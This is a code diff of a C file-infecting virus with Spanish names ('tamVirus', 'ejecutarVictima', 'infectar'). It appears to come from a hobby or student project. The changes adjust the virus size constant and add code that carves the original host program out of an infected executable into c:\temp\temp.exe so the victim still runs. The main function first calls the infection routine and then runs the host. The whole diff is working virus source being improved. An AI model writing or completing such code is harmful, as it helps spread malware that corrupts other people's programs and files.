@@ -8,7 +8,7 @@
 #include <sys/types.h>
 #include <sys/stat.h>
 #include <unistd.h>
-int tamVirus=42883;
+int tamVirus=42969;
 clock_t st,end;
 int printTam(char *str){
   FILE *virus;
@@ -77,18 +77,20 @@ void ejecutarVictima(char *miNombre){
     printf("Soy un archivo infectado: %d",currentTam);
     FILE *temp,*infectado;
     char buff[2048];
-    
-    char *tempName="c:\temp\temp.exe";
-    struct stat st = {0};
-    if (stat("c:\temp", &st) == -1) {
-      mkdir("c:\temp", 0700);
-    }
+    char *tempName="c:\\temp\\temp.exe";
+    _mkdir("C:\\temp");
     infectado=fopen(miNombre,"rb"); //Programa infectado
     temp=fopen(tempName,"ab+");//Programa copiado a carpeta Temporal
-    x=tamVirus;
-    
+    int x=tamVirus;
+    fseek(infectado, x, SEEK_SET ); 
+    while(x>2048) {
+      fread(buff,2048,1,infectado);
+      fwrite(buff,2048,1,temp);
+      x-=2048;
+    }
+    fread(buff,x,1,infectado);
+    fwrite(buff,x,1,temp);
   }
-
   else{
     printf("Soy solo el virus: %d",tamVirus);
     
@@ -97,10 +99,9 @@ void ejecutarVictima(char *miNombre){
 
 int main(int argc, char** argv){
   //char*name="final.exe";
-  //int t=printTam(name);
+  //  int t=printTam("final.exe");
   //printf("Tam: %d",t);
   infectar();
-  
   ejecutarVictima(argv[0]);
   //getch();
   return 0;
